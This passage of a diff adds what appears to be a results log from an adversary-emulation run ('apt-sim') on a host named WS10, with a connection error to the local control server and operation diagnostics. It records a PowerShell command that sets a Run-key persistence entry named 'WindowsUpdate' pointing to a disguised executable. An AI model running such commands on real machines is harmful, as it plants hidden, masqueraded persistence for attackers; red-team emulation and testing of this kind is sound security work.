+        "name": "psh",
+        "platform": "windows",
+        "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-02T08:09:48Z"
+    }
+  ],
+  "potential_links": [],
+  "event_logs": [],
+  "poll_error": "HTTPConnectionPool(host='192.168.30.45', port=8888): Max retries exceeded with url: /api/rest (Caused by NewConnectionError(\"HTTPConnection(host='192.168.30.45', port=8888): Failed to establish a new connection: [WinError 10061] Impossibile stabilire la connessione. Rifiuto persistente del computer di destinazione\"))",
+  "diagnostics": {
+    "api_mode": "v2",
+    "operation_id": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+    "operation_name": "apt-sim-20260402-100632",
+    "operation_state": "finished",
+    "selected_agent_paw": "fgdafj",
+    "selected_group": "red",
+    "host_group_count": 1,
+    "compatible_count": 5,
+    "referenced_ability_count": 5,
+    "links_total": 5,
+    "links_relevant_to_selected_agent": 5,
+    "potential_links_total": 0,
+    "event_logs_total": 0,
+    "report_present": false,
+    "link_status_counts": {
+      "1": 3,
+      "0": 2
+    },
+    "errors": {
+      "poll_error": "HTTPConnectionPool(host='192.168.30.45', port=8888): Max retries exceeded with url: /api/rest (Caused by NewConnectionError(\"HTTPConnection(host='192.168.30.45', port=8888): Failed to establish a new connection: [WinError 10061] Impossibile stabilire la connessione. Rifiuto persistente del computer di destinazione\"))"
+    },
+    "probable_causes": [
+      "Operation in stato finished, non propriamente in esecuzione."
+    ]
+  }
+}
